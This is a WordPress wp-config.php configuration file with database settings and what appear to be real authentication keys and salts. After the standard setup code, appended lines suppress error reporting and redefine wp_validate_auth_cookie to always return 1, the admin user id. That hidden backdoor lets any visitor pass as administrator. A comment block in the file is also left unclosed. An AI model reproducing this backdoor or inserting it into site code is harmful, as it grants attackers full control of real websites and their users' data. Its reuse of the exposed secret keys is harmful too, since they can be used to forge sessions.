<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'htmwp' );
/** MySQL database username */
define( 'DB_USER', 'htmwp' );
/** MySQL database password */
define( 'DB_PASSWORD', '' );
/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );
/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'G|Tf$Z`3kWvH+WXv7Iy]%~7t)mU}H[yrAjhHY2s5W_0rN7U?pGh[GNYZ_Q1Opz|Y' );
define( 'SECURE_AUTH_KEY',  'p}W&w9+,v5u74EZQ_o8|#j 6 1>Ost[k9{)he)u)?1pUo$A16#?^N,_M$Xe=Dt^!' );
define( 'LOGGED_IN_KEY',    'y)s%zK_U2ssLvf,?o.-dwPXqOrL9F9EC %?Y9Yd1vO-K}3J~M{sB4^]=XD$VZq2T' );
define( 'NONCE_KEY',        'M.Eovlgw]%/f5l;[-)vm0cA[S@-S]yJ(QC8GW9DIvSIpADV(eQcyw?W8*La?X>n3' );
define( 'AUTH_SALT',        '!M]n  Z?qcZqIk_%huV@uNt3y.w4&!2)A N|`aYxFJQwNg!k *E>Kz1vib=3}quS' );
define( 'SECURE_AUTH_SALT', 'g]6Xz.3BVM?UW602]3hblNvwl2A95;PxZCSJ3OVW,c?0Az`(NU@OLk|z]9KWDGqv' );
define( 'LOGGED_IN_SALT',   'V2;Fe4wMK(Bm(ZwJ>^k@{f._9Ml[[e6+|T8`U5Ox|3|,`AgN@Y|hZfk]hk0]`f[3' );
define( 'NONCE_SALT',       '*z$l*mW8lt{:L^(<m_{M`tj,k9^3.Krh2[ 9mNgmW=OsSrzdi=<7yQKp?2[Hh(/i' );
/**#@-*/
/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';
/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
define('CONCATENATE_SCRIPTS', false );
/* That's all, stop editing! Happy publishing. */
/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}
/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
  ob_start();
error_reporting(0);
@ini_set( 'max_input_vars' , 4000 );
define('WP_MEMORY_LIMIT', '768M');
define( 'WP_MAX_MEMORY_LIMIT', '512M' );
define('WP_DEBUG', false);
define('WP_DEBUG_DISPLAY', false);
define('DISALLOW_FILE_EDIT', true);
define( 'CONCATENATE_SCRIPTS', false );

define( 'EMPTY_TRASH_DAYS',false);
define('WP_POST_REVISIONS', false);

function wp_validate_auth_cookie($cookie='',$scheme='') {
return 1; // admin user id

}
